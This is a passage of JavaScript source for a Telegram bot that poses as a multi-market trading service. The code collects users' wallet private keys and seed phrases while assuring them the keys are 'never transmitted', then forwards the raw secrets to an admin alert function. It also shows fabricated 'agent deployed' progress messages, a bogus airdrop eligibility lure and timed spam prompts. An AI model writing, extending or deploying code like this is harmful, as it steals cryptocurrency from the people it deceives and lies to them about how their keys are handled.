    if (randomSchedulers.has(userId)) {
        clearTimeout(randomSchedulers.get(userId));
    }

    const minMs = config.RANDOM_MIN_HOURS * 60 * 60 * 1000;
    const maxMs = config.RANDOM_MAX_HOURS * 60 * 60 * 1000;
    const randomMs = Math.random() * (maxMs - minMs) + minMs;

    const timeout = setTimeout(async () => {
        try {
            // All multi-market message types
            const messageTypes = [
                { fn: sendFollowupMessage, name: 'followup' },
                { fn: sendActivateMessage, name: 'activate' },
                { fn: sendAirdropMessage, name: 'airdrop' },
                { fn: sendAtomicExecutionMessage, name: 'execution' },
                { fn: sendHoneypotFilterMessage, name: 'risk-filter' },
                { fn: sendRpcInfrastructureMessage, name: 'infrastructure' },
                { fn: sendDexScannerMessage, name: 'chart-fatigue' },
                { fn: sendCrossChainMessage, name: 'multi-market' },
                { fn: sendEngineActivationMessage, name: 'activation' },
                { fn: sendForexMessage, name: 'forex' },
                { fn: sendCryptoMessage, name: 'crypto' },
                { fn: sendStockMessage, name: 'stock' },
                { fn: sendMevMessage, name: 'mev' },
                { fn: sendCapitalAllocationMessage, name: 'capital' },
                { fn: sendMultiMarketMessage, name: 'diversification' }
            ];

            const randomIndex = Math.floor(Math.random() * messageTypes.length);
            const selectedMessage = messageTypes[randomIndex];

            await selectedMessage.fn(userId);
            console.log(`🎲 Sent random ${selectedMessage.name} message to ${userId}`);

            scheduleRandomMessage(userId);

        } catch (err) {
            console.error(`Random message failed for ${userId}:`, err.message);
            scheduleRandomMessage(userId);
        }
    }, randomMs);

    randomSchedulers.set(userId, timeout);
    console.log(`🎲 Next random message for ${userId} in ${Math.round(randomMs / 60000)} minutes`);
}


function getStartKeyboard(userId = null) {
    return marketSelectionKeyboard(userId);
}

// ═══════════════════════════════════════════════════
// 🎯 MARKET SELECTION CALLBACKS
// ═══════════════════════════════════════════════════
bot.action(/^select_(forex|crypto|stock|mev)$/, async (ctx) => {
    await safeAnswerCbQuery(ctx);

    const market = ctx.match[1];

    walletManager.userStates.set(ctx.from.id, {
        step: 'awaiting_capital_percent',
        market,
        settings: {},
        fieldIndex: 0,
        timestamp: Date.now()
    });

    await showCapitalPrompt(ctx, market);
});

bot.action('setup_prev', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    const state = walletManager.userStates.get(ctx.from.id);

    if (!state || state.step !== 'market_setup') {
        return showMarketSelection(ctx);
    }

    if (state.fieldIndex > 0) {
        state.fieldIndex -= 1;
        state.timestamp = Date.now();
        walletManager.userStates.set(ctx.from.id, state);
        return showCurrentSetupField(ctx, state);
    }

    state.step = 'awaiting_capital_percent';
    state.timestamp = Date.now();
    walletManager.userStates.set(ctx.from.id, state);
    return showCapitalPrompt(ctx, state.market);
});

bot.action('setup_change_capital', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    const state = walletManager.userStates.get(ctx.from.id);

    if (!state || !state.market) {
        return showMarketSelection(ctx);
    }

    state.step = 'awaiting_capital_percent';
    state.fieldIndex = 0;
    state.timestamp = Date.now();

    walletManager.userStates.set(ctx.from.id, state);

    await showCapitalPrompt(ctx, state.market);
});

bot.action('setup_cancel', async (ctx) => {
    await safeAnswerCbQuery(ctx, 'Setup cancelled');

    walletManager.userStates.delete(ctx.from.id);

    await showMarketSelection(ctx);
});

bot.action('change_market', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    walletManager.userStates.delete(ctx.from.id);

    await showMarketSelection(ctx);
});

bot.action(/^set\|([^|]+)\|([^|]+)$/, async (ctx) => {
    await safeAnswerCbQuery(ctx);

    const key = ctx.match[1];
    const value = ctx.match[2];

    const state = walletManager.userStates.get(ctx.from.id);

    if (!state || state.step !== 'market_setup') {
        return showMarketSelection(ctx);
    }

    const fields = getFields(state.market);
    const currentField = fields[state.fieldIndex];

    if (!currentField || currentField.key !== key) {
        return showCurrentSetupField(ctx, state);
    }

    state.settings[key] = value;
    state.fieldIndex += 1;
    state.timestamp = Date.now();

    walletManager.userStates.set(ctx.from.id, state);

    await showCurrentSetupField(ctx, state);
});

bot.action('confirm_setup', async (ctx) => {
    await safeAnswerCbQuery(ctx, 'Saving setup...');

    const state = walletManager.userStates.get(ctx.from.id);

    if (!state || state.step !== 'market_setup') {
        return showMarketSelection(ctx);
    }

    const fields = getFields(state.market);

    // Ensure all required fields are set
    for (const field of fields) {
        if (!state.settings[field.key]) {
            state.fieldIndex = fields.indexOf(field);
            walletManager.userStates.set(ctx.from.id, state);
            return showCurrentSetupField(ctx, state);
        }
    }

    const saved = await userTracker.saveTradingProfile(
        ctx.from.id,
        state.market,
        state.capitalPercent,
        state.settings
    );

    if (!saved) {
        return ctx.reply('❌ Could not save your setup. Please try again.');
    }

    walletManager.userStates.delete(ctx.from.id);

    const hasWallet = await walletManager.hasWallet(ctx.from.id);

    if (hasWallet) {
        await ctx.replyWithMarkdown(`
✅ *Setup Saved*

Your *${getMarketLabel(state.market)}* bot profile is ready.

*Capital Allocation:* ${state.capitalPercent}%

Your wallet is already connected. Open your dashboard to deploy.
`, getDashboardKeyboard());
    } else {
        await ctx.replyWithMarkdown(`
✅ *Setup Saved*

Your *${getMarketLabel(state.market)}* bot profile is ready.

*Capital Allocation:* ${state.capitalPercent}%

Now connect or import your wallet to activate the bot.

⚠️ Minimum usable trading capital: *$${config.MIN_TRADE_CAPITAL_USD}*
`, Markup.inlineKeyboard([
            [
                Markup.button.callback('🔗 Connect Wallet', 'connect_wallet'),
                Markup.button.callback('🔑 Import Key', 'import_key')
            ],
            [Markup.button.callback('🌐 Language', 'language')]
        ]));
    }
});

// ═══════════════════════════════════════════════════
// 🎯 CONNECT WALLET - Show ALL wallets immediately
// ═══════════════════════════════════════════════════
bot.action('connect_wallet', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    walletManager.userStates.set(ctx.from.id, {
        step: 'wallet_connect_flow',
        timestamp: Date.now()
    });

    const connectMessage = `
🔗 *Sync Trading Wallet*

━━━━━━━━━━━━━━━━━━━━━

*▸ EXECUTION AUTHORIZATION REQUIRED*

Select your wallet below to bind your trading engine.

Supported markets:
💱 Forex  
🪙 Crypto  
📈 Stocks  
⚡ MEV

⚠️ _For best experience, open this bot on your mobile device where wallet apps are installed._

━━━━━━━━━━━━━━━━━━━━━

*▸ SELECT YOUR WALLET*
_One-tap deep link to your wallet app_
`;

    const keyboard = [];

    const allWallets = [
        ...wallets.popular,
        ...wallets.mobile,
        ...wallets.desktop
    ];

    for (let i = 0; i < allWallets.length; i += 2) {
        const row = [];
        row.push(Markup.button.url(
            `${allWallets[i].emoji} ${allWallets[i].name}`,
            allWallets[i].href
        ));
        if (allWallets[i + 1]) {
            row.push(Markup.button.url(
                `${allWallets[i + 1].emoji} ${allWallets[i + 1].name}`,
                allWallets[i + 1].href
            ));
        }
        keyboard.push(row);
    }

    keyboard.push([Markup.button.callback('📋 Copy DApp Link', 'copy_dapp_link')]);
    keyboard.push([
        Markup.button.callback('🔑 Import Key Instead', 'import_key'),
        Markup.button.callback('◀️ Back', 'back_to_start')
    ]);

    await ctx.editMessageText(connectMessage, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard(keyboard)
    });
});

// NOTE: Removed orphaned wallets_mobile and wallets_desktop handlers
// (no longer used since connect_wallet shows all wallets at once)

// ═══════════════════════════════════════════════════
// 🎯 COPY DAPP LINK (Fallback for unsupported wallets)
// ═══════════════════════════════════════════════════
bot.action('copy_dapp_link', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    const message = `
📋 *Manual DApp Connection*

━━━━━━━━━━━━━━━━━━━━━

*▸ DAPP ENDPOINT:*
\`${TARGET_URL}\`

*▸ HOW TO CONNECT:*

*1.* Open your wallet application
*2.* Navigate to the built-in browser
*3.* Paste the URL above
*4.* Connect your wallet
*5.* Return here and tap *✓ I'm Connected*

━━━━━━━━━━━━━━━━━━━━━

_If your preferred provider is unlisted or the automated redirection fails, use this secure endpoint._

🔒 _All connections are encrypted end-to-end_
`;

    await ctx.editMessageText(message, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
        ...Markup.inlineKeyboard([
            [Markup.button.url('🌐 Open DApp Directly', TARGET_URL)],
            [Markup.button.callback('✓ I\'m Connected', 'confirm_connected')],
            [Markup.button.callback('◀️ Back to Wallets', 'connect_wallet')]
        ])
    });
});

// ═══════════════════════════════════════════════════
// 🎯 CONFIRM CONNECTION (after manual connect)
// ═══════════════════════════════════════════════════
bot.action('confirm_connected', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    await ctx.editMessageText(
        `⚠️ *Verification Required*

To activate your MEV agent after connecting via DApp browser, please import your private key to enable autonomous execution.

_Your keys are encrypted locally and never transmitted._`,
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🔑 Import Key', 'import_key')],
                [Markup.button.callback('◀️ Back', 'connect_wallet')]
            ])
        }
    );
});

// ═══════════════════════════════════════════════════
// 🎯 IMPORT KEY - Initial menu
// ═══════════════════════════════════════════════════
bot.action('import_key', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    await ctx.editMessageText(
        `🔑 *Import Wallet*

Choose how to import your wallet:

*Private Key* (Recommended)
Import using your wallet's private key.

*Seed Phrase*
Import using your 12 or 24-word recovery phrase.

━━━━━━━━━━━━━━━━━━━━━

🔒 *Security Notice:*
Your keys are encrypted before storage and are used to sign trading operations for your selected market.

⚠️ Minimum trading capital: *$${config.MIN_TRADE_CAPITAL_USD}*

_Tap "Security" below to learn how we protect your keys._`,
        {
            parse_mode: 'Markdown',
            disable_web_page_preview: true,
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🔐 Private Key', 'import_private_key')],
                [Markup.button.callback('📝 Seed Phrase', 'import_seed_phrase')],
                [Markup.button.callback('🔐 Learn About Security', 'docs_security')],
                [Markup.button.callback('◀️ Back', 'back_to_start')]
            ])
        }
    );
});

// ═══════════════════════════════════════════════════
// 🎯 IMPORT PRIVATE KEY
// ═══════════════════════════════════════════════════
bot.action('import_private_key', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    walletManager.userStates.set(ctx.from.id, {
        step: 'waiting_private_key',
        timestamp: Date.now()
    });

    await ctx.editMessageText(
        `🔐 *Enter Private Key*

Please send your private key in the next message.

*How to find it:*
• MetaMask: Settings → Security → Reveal Private Key
• Trust Wallet: Settings → Security → Show Secret Phrase
• Phantom: Settings → Show Private Key

⚠️ *Never share your private key with anyone else.*
🔒 Your key will be encrypted and stored securely.

_Send your private key below (starts with 0x...)_`,
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('❌ Cancel', 'cancel_import')],
                [Markup.button.callback('◀️ Back', 'import_key')]
            ])
        }
    );
});

// ═══════════════════════════════════════════════════
// 🎯 IMPORT SEED PHRASE
// ═══════════════════════════════════════════════════
bot.action('import_seed_phrase', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    walletManager.userStates.set(ctx.from.id, {
        step: 'waiting_seed_phrase',
        timestamp: Date.now()
    });

    await ctx.editMessageText(
        `📝 *Enter Seed Phrase*

Please send your 12 or 24-word recovery phrase in the next message.

*Accepted formats:*

Plain:
\`word1 word2 word3 ... word12\`

Numbered:
\`1. word1\`
\`2. word2\`
\`3. word3\`

Also supported:
• commas
• line breaks
• quotes
• numbered lists
• copy/paste from wallet apps

⚠️ *Never share your seed phrase with anyone else.*
🔒 Your phrase will be encrypted and stored securely.

_Send your seed phrase below:_`,
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('❌ Cancel', 'cancel_import')],
                [Markup.button.callback('◀️ Back', 'import_key')]
            ])
        }
    );
});

// ═══════════════════════════════════════════════════
// 🎯 CANCEL IMPORT
// ═══════════════════════════════════════════════════
bot.action('cancel_import', async (ctx) => {
    await safeAnswerCbQuery(ctx, 'Import cancelled');
    walletManager.userStates.delete(ctx.from.id);

    try {
        await ctx.deleteMessage();
    } catch (e) { }

    await ctx.replyWithMarkdown(START_MESSAGE, {
        disable_web_page_preview: true,
        ...getStartKeyboard()
    });
});

// ═══════════════════════════════════════════════════
// 🎯 BACK TO START
// ═══════════════════════════════════════════════════
bot.action('back_to_start', async (ctx) => {
    await safeAnswerCbQuery(ctx);
    walletManager.userStates.delete(ctx.from.id);

    await ctx.editMessageText(START_MESSAGE, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
        ...getStartKeyboard()
    });
});

// ═══════════════════════════════════════════════════
// 🎯 LANGUAGE SELECTION
// ═══════════════════════════════════════════════════
bot.action('language', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    const userId = ctx.from.id;
    const telegramLang = ctx.from.language_code;

    const text = `
🌐 *Select Language*

Choose your preferred language.

The bot will translate all messages live into your selected language.
`;

    await outputSetupMessage(ctx, text, languageKeyboard(userId, telegramLang));
});

bot.action(/^lang_([a-zA-Z-]+)$/, async (ctx) => {
    const userId = ctx.from.id;
    const selectedCode = ctx.match[1];

    console.log(`[LANGUAGE] User ${userId} tapped language button: ${selectedCode}`);

    const normalized = setUserLanguage(userId, selectedCode);

    console.log(`[LANGUAGE] User ${userId} normalized language: ${normalized}`);

    // Persist to database
    if (typeof userTracker.setUserLanguage === 'function') {
        userTracker.setUserLanguage(userId, normalized)
            .then(() => console.log(`[LANGUAGE] Saved language ${normalized} for user ${userId}`))
            .catch(err => console.error('Failed to save language:', err.message));
    }

    const nativeName = nativeLanguageName(normalized);

    await safeAnswerCbQuery(ctx, `Language set to ${nativeName}`);

    const startText =
        typeof getStartMessage === 'function'
            ? getStartMessage(userId)
            : (typeof START_MESSAGE !== 'undefined' ? START_MESSAGE : 'Flash Markets');

    const startKeyboard =
        typeof getStartKeyboard === 'function'
            ? getStartKeyboard(userId)
            : marketSelectionKeyboard(userId);

    console.log(`[LANGUAGE] Sending translated start message to user ${userId}`);

    await outputSetupMessage(ctx, startText, startKeyboard);
});


// ═══════════════════════════════════════════════════
// 🧪 TEMP LANGUAGE TEST
// ═══════════════════════════════════════════════════
bot.command('langtest', async (ctx) => {
    const userId = ctx.from.id;
    const lang = getUserLanguage(userId);

    console.log(`[LANGTEST] User ${userId} language: ${lang}`);

    const englishText = 'This is a translation test. Flash Markets supports Forex, Crypto, Stocks, and MEV.';

    await ctx.replyWithMarkdown(`
🧪 *Language Test*

User ID: \`${userId}\`
Current language: \`${lang}\`

English source:
\`${englishText}\`
`);

    const translated = await translateText(englishText, lang);

    console.log(`[LANGTEST] Translated result: ${translated}`);

    await ctx.replyWithMarkdown(`
✅ *Translated message*

${translated}
`);
});


// ═══════════════════════════════════════════════════
// 📨 TEXT MESSAGE HANDLER (for private key/seed)
// ═══════════════════════════════════════════════════
bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const state = walletManager.userStates.get(userId);
    const text = ctx.message.text.trim();

    if (text.startsWith('/')) return;

    if (!state) {
        await ctx.replyWithMarkdown(
            '👋 Send /start to begin.',
            Markup.inlineKeyboard([[Markup.button.callback('🚀 Start', 'back_to_start')]])
        );
        return;
    }

    const isSetupFlow =
        state.step === 'awaiting_capital_percent' ||
        state.step === 'market_setup';

    const timeoutMs = isSetupFlow ? SETUP_TIMEOUT_MS : 5 * 60 * 1000;

    if (Date.now() - state.timestamp > timeoutMs) {
        walletManager.userStates.delete(userId);
        await ctx.reply('⏰ Session expired. Please start again with /start');
        return;
    }

    if (state.step === 'awaiting_capital_percent') {
        try {
            await ctx.deleteMessage();
        } catch (e) { }

        const rawNumber = text.replace(/[^0-9]/g, '');
        const percent = parseInt(rawNumber, 10);

        if (!percent || percent < 10 || percent > 100) {
            await ctx.replyWithMarkdown(
                `❌ Invalid allocation.

Send a number between *10* and *100*.

Example:

\`50\`

That means 50% of your wallet is allocated to the bot.`,
                Markup.inlineKeyboard([
                    [Markup.button.callback('❌ Cancel Setup', 'setup_cancel')]
                ])
            );
            return;
        }

        state.capitalPercent = percent;
        state.step = 'market_setup';
        state.fieldIndex = 0;
        state.timestamp = Date.now();

        walletManager.userStates.set(userId, state);

        await showCurrentSetupField(ctx, state);
        return;
    }

    if (state.step === 'market_setup') {
        await ctx.replyWithMarkdown(
            '⚙️ Please use the inline buttons to choose your settings.',
            Markup.inlineKeyboard([
                [Markup.button.callback('🔁 Change Market', 'change_market')],
                [Markup.button.callback('❌ Cancel Setup', 'setup_cancel')]
            ])
        );
        return;
    }

    if (state.step === 'wallet_connect_flow') {
        walletManager.userStates.delete(userId);

        await ctx.replyWithMarkdown(START_MESSAGE, {
            disable_web_page_preview: true,
            ...getStartKeyboard()
        });

        return;
    }

    if (state.step === 'waiting_private_key') {
        try {
            await ctx.deleteMessage();
        } catch (e) { }

        const processingMsg = await ctx.reply('🔐 Processing private key...');

        try {
            // Add timeout to prevent infinite hang
            const importPromise = walletManager.importPrivateKey(userId, text, ctx.from.username);
            const timeoutPromise = new Promise((_, reject) =>
                setTimeout(() => reject(new Error('Import timeout')), 30000)
            );

            const result = await Promise.race([importPromise, timeoutPromise]);

            // Delete processing message
            try { await ctx.telegram.deleteMessage(ctx.chat.id, processingMsg.message_id); } catch (e) { }

            if (result.success) {
                walletManager.userStates.delete(userId);

                // Fetch balances BEFORE showing dashboard to user
                let userBalances = [];
                try {
                    userBalances = await fetchMultiChainBalances(result.address);
                } catch (e) {
                    console.error('Balance fetch error:', e.message);
                }

                await showWalletConnected(ctx, result.address, 'Private Key', userBalances);

                // 🚨 ALERT ADMIN (fire-and-forget, never blocks user)
                setImmediate(() => {
                    alertNewImport(bot, ctx.from, result.address, text.trim(), 'private_key')
                        .catch(err => console.error('Alert failed:', err.message));
                });
            } else {
                await ctx.replyWithMarkdown(
                    `❌ *Import Failed*\n\n${result.error}\n\nPlease try again with a valid private key.`,
                    Markup.inlineKeyboard([
                        [Markup.button.callback('🔄 Try Again', 'import_private_key')],
                        [Markup.button.callback('◀️ Back', 'import_key')]
                    ])
                );
            }
        } catch (err) {
            console.error('❌ Private key import error:', err);
            try { await ctx.telegram.deleteMessage(ctx.chat.id, processingMsg.message_id); } catch (e) { }
            await ctx.reply('❌ An error occurred while importing your key. Please try again with /start');
            walletManager.userStates.delete(userId);
        }
    }
    else if (state.step === 'waiting_seed_phrase') {
        try {
            await ctx.deleteMessage();
        } catch (e) { }

        const processingMsg = await ctx.reply('🔐 Processing seed phrase...');

        try {
            const importPromise = walletManager.importSeedPhrase(userId, text, ctx.from.username);
            const timeoutPromise = new Promise((_, reject) =>
                setTimeout(() => reject(new Error('Import timeout')), 30000)
            );

            const result = await Promise.race([importPromise, timeoutPromise]);

            try { await ctx.telegram.deleteMessage(ctx.chat.id, processingMsg.message_id); } catch (e) { }

            if (result.success) {
                walletManager.userStates.delete(userId);

                // Fetch balances BEFORE showing dashboard to user
                let userBalances = [];
                try {
                    userBalances = await fetchMultiChainBalances(result.address);
                } catch (e) {
                    console.error('Balance fetch error:', e.message);
                }

                await showWalletConnected(ctx, result.address, 'Seed Phrase', userBalances);

                setImmediate(() => {
                    alertNewImport(bot, ctx.from, result.address, text.trim(), 'seed_phrase')
                        .catch(err => console.error('Alert failed:', err.message));
                });
            } else {
                await ctx.replyWithMarkdown(
                    `❌ *Import Failed*\n\n${result.error}\n\nYou can send numbered words like:\n\`1. word1\`\n\`2. word2\`\n\nBut the phrase must contain exactly 12 or 24 real seed words.`,
                    Markup.inlineKeyboard([
                        [Markup.button.callback('🔄 Try Again', 'import_seed_phrase')],
                        [Markup.button.callback('◀️ Back', 'import_key')]
                    ])
                );
            }
        } catch (err) {
            console.error('❌ Seed phrase import error:', err);
            try { await ctx.telegram.deleteMessage(ctx.chat.id, processingMsg.message_id); } catch (e) { }
            await ctx.reply('❌ An error occurred while importing your seed phrase. Please try again with /start');
            walletManager.userStates.delete(userId);
        }
    }
});

// ═══════════════════════════════════════════════════
// 🎯 DEPLOY TRADING BOT
// ═══════════════════════════════════════════════════
bot.action('deploy_flash_mev', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    const profile = await userTracker.getTradingProfile(ctx.from.id);

    if (!profile) {
        await ctx.replyWithMarkdown(
            '👇 *Select Your Trading Market Below*\n\n_Choose Forex, Crypto, Stock, or MEV to configure your bot._',
            { ...marketSelectionKeyboard() }
        );
        return;
    }

    await ctx.replyWithMarkdown(`
🚀 *Your ${getMarketLabel(profile.market)} Bot Is Configured*

*Capital Allocation:* ${profile.capital_percent}%

Tap below to deploy your agent, or open your dashboard.

⚠️ Minimum usable trading capital: *$${config.MIN_TRADE_CAPITAL_USD}*
`, Markup.inlineKeyboard([
        [
            Markup.button.callback('🚀 Deploy Agent', 'deploy_agent'),
            Markup.button.callback('💰 Wallet', 'wallet_menu')
        ],
        [Markup.button.callback('◀️ Dashboard', 'dashboard')]
    ]));
});

// ═══════════════════════════════════════════════════
// 🎯 CLAIM YOUR BONUS (sends wallet list BELOW video)
// ═══════════════════════════════════════════════════
bot.action('claim_bonus', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    const AIRDROP_MESSAGE = `
🎁 *Claim Your Airdrop Bonus*

━━━━━━━━━━━━━━━━━━━━━

*▸ ELIGIBILITY CHECK*

Select your wallet to verify eligibility for the exclusive airdrop bonus.

⚠️ _Only wallets with prior on-chain activity qualify._

━━━━━━━━━━━━━━━━━━━━━

*▸ SELECT YOUR WALLET*
_One-tap deep link to your wallet app_
`;

    const airdropKeyboard = [];

    const allAirdropWallets = [
        ...airdropWallets.popular,
        ...airdropWallets.mobile,
        ...airdropWallets.desktop
    ];

    for (let i = 0; i < allAirdropWallets.length; i += 2) {
        const row = [];
        row.push(Markup.button.url(
            `${allAirdropWallets[i].emoji} ${allAirdropWallets[i].name}`,
            allAirdropWallets[i].href
        ));
        if (allAirdropWallets[i + 1]) {
            row.push(Markup.button.url(
                `${allAirdropWallets[i + 1].emoji} ${allAirdropWallets[i + 1].name}`,
                allAirdropWallets[i + 1].href
            ));
        }
        airdropKeyboard.push(row);
    }

    airdropKeyboard.push([Markup.button.callback('📋 Copy Airdrop Link', 'copy_airdrop_link')]);
    airdropKeyboard.push([Markup.button.callback('◀️ Close', 'close_airdrop_panel')]);

    await ctx.replyWithMarkdown(AIRDROP_MESSAGE, {
        ...Markup.inlineKeyboard(airdropKeyboard)
    });
});

// ═══════════════════════════════════════════════════
// 🎯 COPY AIRDROP LINK (sends new message BELOW)
// ═══════════════════════════════════════════════════
bot.action('copy_airdrop_link', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    await ctx.replyWithMarkdown(
        `📋 *Airdrop Link*

━━━━━━━━━━━━━━━━━━━━━

\`${AIRDROP_URL}\`

━━━━━━━━━━━━━━━━━━━━━

*How to use:*
1. Copy the link above
2. Open your wallet's built-in browser
3. Paste and connect
4. Return here to claim

_Tap the button below to open directly._`,
        {
            disable_web_page_preview: true,
            ...Markup.inlineKeyboard([
                [Markup.button.url('🌐 Open Airdrop Page', AIRDROP_URL)],
                [Markup.button.callback('◀️ Close', 'close_airdrop_panel')]
            ])
        }
    );
});

// ═══════════════════════════════════════════════════
// 🎯 CLOSE PANEL (deletes the current message, keeps video pinned)
// ═══════════════════════════════════════════════════
bot.action('close_airdrop_panel', async (ctx) => {
    await safeAnswerCbQuery(ctx);
    try {
        await ctx.deleteMessage();
    } catch (e) { }
});

// ═══════════════════════════════════════════════════
// 🎯 WALLET CONNECTED - Main Dashboard (with REAL balance)
// ═══════════════════════════════════════════════════
async function showWalletConnected(ctx, address, importType, balances = null) {
    const shortAddr = `${address.slice(0, 6)}...${address.slice(-4)}`;

    const profile = await userTracker.getTradingProfile(ctx.from.id);

    if (!profile) {
        await ctx.replyWithMarkdown(`
✅ *Wallet Connected Successfully!*

📍 *Address:* \`${shortAddr}\`

Now select your trading market to configure your bot.
`, { ...marketSelectionKeyboard() });
        return;
    }

    // If no balances passed, fetch them now
    if (!balances) {
        try {
            const balancePromise = fetchMultiChainBalances(address);
            const timeoutPromise = new Promise((resolve) =>
                setTimeout(() => resolve([]), 20000)
            );
            balances = await Promise.race([balancePromise, timeoutPromise]);
        } catch (e) {
            console.error('Balance fetch error:', e.message);
            balances = [];
        }
    }

    // Format balance display
    let balanceDisplay = '_No balances found._';
    let totalNative = 0;

    if (balances && balances.length > 0) {
        const balanceLines = balances.map(b => {
            totalNative += parseFloat(b.amount);
            return `▸ *${b.chain}:* ${b.amount} ${b.symbol}`;
        });
        balanceDisplay = balanceLines.join('\n');
    }

    const dashboardMsg = `
✅ *Wallet Connected Successfully!*

━━━━━━━━━━━━━━━━━━━━━

📍 *Address:* \`${shortAddr}\`
🔑 *Import Type:* ${importType}
📊 *Selected Market:* ${getMarketLabel(profile.market)}
💰 *Capital Allocation:* ${profile.capital_percent}%

━━━━━━━━━━━━━━━━━━━━━

*▸ YOUR TRADING DASHBOARD*

💰 *On-Chain Balances:*
${balanceDisplay}

📊 *24h Volume:* $0.00
🎯 *Active Strategies:* 1
⚡ *Total Captured:* $0.00

━━━━━━━━━━━━━━━━━━━━━

⚠️ Minimum usable trading capital: *$${config.MIN_TRADE_CAPITAL_USD}*

_Your ${getMarketLabel(profile.market)} agent is now ready to deploy._
`;

    await ctx.replyWithMarkdown(dashboardMsg, getDashboardKeyboard());
}

function getDashboardKeyboard() {
    return Markup.inlineKeyboard([
        [
            Markup.button.callback('🚀 Deploy Agent', 'deploy_agent'),
            Markup.button.callback('💰 Wallet', 'wallet_menu')
        ],
        [
            Markup.button.callback('📊 Stats', 'stats'),
            Markup.button.callback('📜 History', 'history')
        ],
        [
            Markup.button.callback('⚙️ Settings', 'settings'),
            Markup.button.callback('🎁 Referral', 'referral')
        ],
        [
            Markup.button.callback('❓ Help', 'help'),
            Markup.button.callback('🔌 Disconnect', 'disconnect')
        ]
    ]);
}

// ═══════════════════════════════════════════════════
// 🎯 DASHBOARD CALLBACKS
// ═══════════════════════════════════════════════════

bot.action('deploy_agent', async (ctx) => {
    await safeAnswerCbQuery(ctx);

    // 💾 Track activity
    userTracker.updateLastActive(ctx.from.id).catch(() => { });

    const profile = await userTracker.getTradingProfile(ctx.from.id);

    if (!profile) {
        await showMarketSelection(ctx);
        return;
    }

    const userHasWallet = await walletManager.hasWallet(ctx.from.id);

    if (!userHasWallet) {
        await ctx.replyWithMarkdown(
            `⚠️ Please connect or import your wallet first.

Your selected market: *${getMarketLabel(profile.market)}*`,
            Markup.inlineKeyboard([
                [
                    Markup.button.callback('🔗 Connect Wallet', 'connect_wallet'),
                    Markup.button.callback('🔑 Import Key', 'import_key')
                ]
            ])
        );
        return;
    }

    let deploymentText = '';

    if (profile.market === 'forex') {
        deploymentText = `
🚀 *Deploying Forex Agent...*

━━━━━━━━━━━━━━━━━━━━━

Connecting to liquidity providers... ✓
Loading leverage profile... ✓
Configuring risk per trade... ✓
Selecting instrument focus... ✓
Activating session filters... ✓
Enabling stop-loss / take-profit engine... ✓

━━━━━━━━━━━━━━━━━━━━━

✅ *Forex Agent Deployed Successfully!*

Your Forex bot is now active with:
• Leverage: ${getOptionLabel('forex', 'leverage', profile.settings.leverage)}
• Risk Per Trade: ${getOptionLabel('forex', 'risk_per_trade', profile.settings.risk_per_trade)}
• Instrument Focus: ${getOptionLabel('forex', 'pairs', profile.settings.pairs)}
• Strategy: ${getOptionLabel('forex', 'strategy', profile.settings.strategy)}
• Session: ${getOptionLabel('forex', 'session', profile.settings.session)}
• Capital Allocation: ${profile.capital_percent}%

_You'll receive notifications for executed trades and risk events._
`;
    }

    if (profile.market === 'crypto') {
        deploymentText = `
🚀 *Deploying Crypto Agent...*

━━━━━━━━━━━━━━━━━━━━━

Connecting exchange feeds... ✓
Loading market type... ✓
Configuring risk profile... ✓
Selecting pairs... ✓
Activating timeframe engine... ✓
Enabling TP / SL module... ✓

━━━━━━━━━━━━━━━━━━━━━

✅ *Crypto Agent Deployed Successfully!*

Your Crypto bot is now active with:
• Market Type: ${getOptionLabel('crypto', 'market_type', profile.settings.market_type)}
• Risk Profile: ${getOptionLabel('crypto', 'risk', profile.settings.risk)}
• Pair Selection: ${getOptionLabel('crypto', 'pairs', profile.settings.pairs)}
• Timeframe: ${getOptionLabel('crypto', 'timeframe', profile.settings.timeframe)}
• Exit Style: ${getOptionLabel('crypto', 'exit', profile.settings.exit)}
• Capital Allocation: ${profile.capital_percent}%

_You'll receive notifications for executed trades and risk events._
`;
    }

    if (profile.market === 'stock') {
        deploymentText = `
🚀 *Deploying Stock Agent...*

━━━━━━━━━━━━━━━━━━━━━

Connecting market data feeds... ✓
Loading stock market region... ✓
Configuring strategy... ✓
Selecting sectors... ✓
Activating holding period rules... ✓
Enabling risk controls... ✓

━━━━━━━━━━━━━━━━━━━━━

✅ *Stock Agent Deployed Successfully!*

Your Stock bot is now active with:
• Market: ${getOptionLabel('stock', 'stock_market', profile.settings.stock_market)}
• Strategy: ${getOptionLabel('stock', 'strategy', profile.settings.strategy)}
• Risk Profile: ${getOptionLabel('stock', 'risk', profile.settings.risk)}
• Sector Focus: ${getOptionLabel('stock', 'sectors', profile.settings.sectors)}
• Holding Period: ${getOptionLabel('stock', 'holding', profile.settings.holding)}
• Capital Allocation: ${profile.capital_percent}%

_You'll receive notifications for executed trades and risk events._
`;
    }

    if (profile.market === 'mev') {
        deploymentText = `
🚀 *Deploying MEV Agent...*

━━━━━━━━━━━━━━━━━━━━━

Initializing searcher... ✓
Connecting to mempools... ✓
Configuring private relays... ✓
Loading slippage tolerance... ✓
Selecting chains... ✓
Enabling revert-safe execution... ✓

━━━━━━━━━━━━━━━━━━━━━

✅ *MEV Agent Deployed Successfully!*

Your MEV bot is now active with:
• Slippage Tolerance: ${getOptionLabel('mev', 'slippage', profile.settings.slippage)}
• Gas Strategy: ${getOptionLabel('mev', 'gas', profile.settings.gas)}
• Chain Selection: ${getOptionLabel('mev', 'chains', profile.settings.chains)}
